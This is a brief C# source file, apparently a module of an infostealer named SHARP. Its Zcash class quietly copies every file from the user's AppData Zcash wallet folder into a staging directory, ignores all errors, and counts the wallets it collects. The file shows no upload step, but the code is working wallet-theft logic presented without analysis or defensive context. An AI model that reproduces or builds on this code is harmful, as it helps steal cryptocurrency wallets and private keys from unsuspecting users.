using System.IO;

namespace SHARP
{
    internal class Zcash
    {
      public static int count = 0;
      public static string ZcashDir = "\\Wallets\\Zcash\\";

      public static void ZecwalletStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Zcash\\").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
            file.CopyTo(directorypath + Zcash.ZcashDir + file.Name);
          }
          ++Counting.zcash;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
